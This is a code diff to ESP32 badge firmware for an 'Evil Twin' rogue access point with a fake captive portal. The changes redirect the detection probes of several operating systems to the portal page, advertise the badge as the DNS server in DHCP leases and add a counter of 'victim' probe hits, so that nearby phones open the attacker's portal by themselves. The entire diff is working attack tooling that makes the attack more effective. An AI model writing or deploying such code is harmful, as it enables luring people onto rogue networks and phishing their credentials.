@@ -28,6 +28,14 @@ WebServer server(80);
 static String _evilNoteCache;
 static bool _evilNoteLoaded = false;
 
+// Captive-portal probe counter. This is the decisive diagnostic for "the AP
+// works but no portal appears": if it stays at zero, the victim's device never
+// reached us at all, which means the lease is not pointing it at our name
+// server. If it climbs while the portal still refuses to open, the probe did
+// arrive and the fault is in what we answered, not in being reachable. Without
+// this number the two cases are indistinguishable from the outside.
+static volatile uint32_t _cpProbes = 0;
+
 static void evilNote(const String &msg) {
   Serial.println("[MGMT] " + msg);
   _evilNoteCache  = msg;
@@ -231,6 +239,7 @@ void EvilPortal::setupServer() {
 
   // ── CAPTIVE PORTAL PROBES ──────────────────────────────────
   auto redirect = [this]() {
+    _cpProbes++;
     server.sendHeader("Location", "/portal.html", true);
     server.send(302, "text/plain", "");
   };
@@ -239,7 +248,13 @@ void EvilPortal::setupServer() {
   server.on("/hotspot-detect.html", [redirect](){ redirect(); }); // Apple
   server.on("/library/test/success.html", [redirect](){ redirect(); }); // Apple
   server.on("/ncsi.txt",            [redirect](){ redirect(); }); // Windows
-  server.on("/success.txt",         [this]() { server.send(200,"text/plain","success"); });
+  // Firefox's probe. This used to answer the literal body "success", which is
+  // precisely how a client is told the network is already online - the opposite
+  // of what a captive portal wants. Redirected like every other probe.
+  server.on("/success.txt",         [redirect](){ redirect(); }); // Firefox
+  server.on("/connecttest.txt",     [redirect](){ redirect(); }); // Windows 10+
+  server.on("/canonical.html",      [redirect](){ redirect(); }); // Ubuntu/GNOME
+  server.on("/chat",                [redirect](){ redirect(); }); // Apple (iOS 17+)
 
   // ── REDIRECT ROOT → PORTAL ────────────────────────────────
   server.on("/", [this]() {
@@ -359,6 +374,9 @@ void EvilPortal::setupServer() {
 
   // ── NOT FOUND → REDIRECT ──────────────────────────────────
   server.onNotFound([this]() {
+    // Counted as a probe too: a device may request a detection URL we have not
+    // registered, and that still proves it reached the badge.
+    _cpProbes++;
     server.sendHeader("Location", "/portal.html", true);
     server.send(302, "text/plain", "");
   });
@@ -2393,19 +2411,59 @@ void EvilPortal::setupManagementServer() {
 
     // DHCP server: mirror the management path. Without this an associated
     // victim gets no IP and never loads the portal.
+    //
+    // A lease on its own is not enough for a phone to OPEN the portal by
+    // itself. iOS and Android judge a network by fetching a known URL
+    // (captive.apple.com, connectivitycheck.gstatic.com) and they can only
+    // reach ours if the lease tells them to use the badge as their name
+    // server. ESP-IDF's DHCP server does NOT advertise one unless OFFER_DNS
+    // is set explicitly, and nothing here ever set it - so every probe went to
+    // whatever resolver the phone already had and never arrived at the badge.
+    // That is exactly why opening 192.168.4.1 by hand showed the portal while
+    // the sheet never appeared on its own: a manual visit needs no lookup.
     esp_netif_t *et_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
     if (et_netif) {
+      bool cp_ok = false;
+#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
+      // RFC 8910 (DHCP option 114). iOS 14+ and Android 11+ open the portal
+      // straight from this hint without waiting for a probe to fail, so it is
+      // a second and faster path to the same result. Done first because it
+      // stops and restarts DHCP internally, which would otherwise undo the
+      // option set below. Best effort: older clients ignore it and fall back
+      // to the name-server path.
+      cp_ok = WiFi.AP.enableDhcpCaptivePortal();
+#endif
+      esp_netif_dhcps_stop(et_netif);
+
+      // Advertise the badge itself as the name server.
+      esp_netif_dns_info_t et_dns;
+      memset(&et_dns, 0, sizeof(et_dns));
+      et_dns.ip.type = ESP_IPADDR_TYPE_V4;
+      et_dns.ip.u_addr.ip4.addr = static_cast<uint32_t>(WiFi.softAPIP());
+      esp_err_t dns_err = esp_netif_set_dns_info(et_netif, ESP_NETIF_DNS_MAIN, &et_dns);
+
+      // lwip's dhcps_offer_t bit meaning "include a DNS server in the lease"
+      // (OFFER_DNS in dhcpserver.h). Written as a local constant to avoid
+      // pulling an lwip application header into this translation unit.
+      const uint8_t OFFER_DNS_BIT = 0x02;
+      uint8_t et_offer = OFFER_DNS_BIT;
+      esp_err_t off_err = esp_netif_dhcps_option(
+          et_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
+          &et_offer, sizeof(et_offer));
+
+      esp_err_t dh_err = esp_netif_dhcps_start(et_netif);
+
       esp_netif_dhcp_status_t et_st = ESP_NETIF_DHCP_INIT;
       esp_netif_dhcps_get_status(et_netif, &et_st);
-      if (et_st != ESP_NETIF_DHCP_STARTED) {
-        esp_err_t et_err = esp_netif_dhcps_start(et_netif);
-        Serial.printf("[MGMT] Evil Twin DHCP was %d, start -> %d\n",
-                      (int)et_st, (int)et_err);
-      }
-      esp_netif_dhcps_get_status(et_netif, &et_st);
-      Serial.printf("[MGMT] Evil Twin AP up ip=%s dhcps=%s\n",
-                    WiFi.softAPIP().toString().c_str(),
-                    et_st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF");
+      evilNote("Evil Twin DHCP: dhcps=" +
+               String(et_st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF") +
+               " dns_offer=" + String(off_err == ESP_OK ? "ok" : "ERR") +
+               " dns_set=" + String(dns_err == ESP_OK ? "ok" : "ERR") +
+               " start=" + String((int)dh_err) +
+               " rfc8910=" + String(cp_ok ? "ok" : "no") +
+               " ip=" + WiFi.softAPIP().toString());
+    } else {
+      evilNote("Evil Twin WARNING: AP netif handle not found, no DHCP/DNS offer");
     }
 
     // Read the beacon configuration back from the driver instead of trusting the
@@ -2879,6 +2937,10 @@ String EvilPortal::mgmtStateJson() {
   // which is the only way the operator can ever see it: the management AP is
   // down for the whole attack and the RAM log is gone by the time it returns.
   json += ",\"evil_last\":\"" + mgmtJsonEscape(evilNoteRead()) + "\"";
+  // Probe hits since start. Zero while an evil twin is up means no victim
+  // device ever reached us; a rising number means they did and the portal
+  // decision is theirs, not ours.
+  json += ",\"cp_probes\":" + String((uint32_t)_cpProbes);
   // H: job object per contract
   json += ",\"job\":{\"kind\":\"" + mgmtJsonEscape(job_kind) + "\"";
   json += ",\"type\":\"" + mgmtJsonEscape(job_type) + "\"";
